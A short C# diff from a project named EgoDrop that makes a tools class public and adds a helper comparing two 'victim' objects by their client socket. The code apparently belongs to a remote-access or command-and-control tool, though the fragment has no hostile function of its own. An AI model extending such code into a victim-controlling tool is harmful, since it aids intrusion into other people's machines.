@@ -6,7 +6,7 @@ using System.Threading.Tasks;
 
 namespace EgoDrop
 {
-    internal class clsTools
+    public class clsTools
     {
         public clsTools()
         {
@@ -26,6 +26,11 @@ namespace EgoDrop
             }
 
             return abBytes;
+        }
+
+        public static bool fnbSameVictim(clsVictim v1, clsVictim v2)
+        {
+            return v1.m_sktClnt == v2.m_sktClnt;
         }
     }
 }
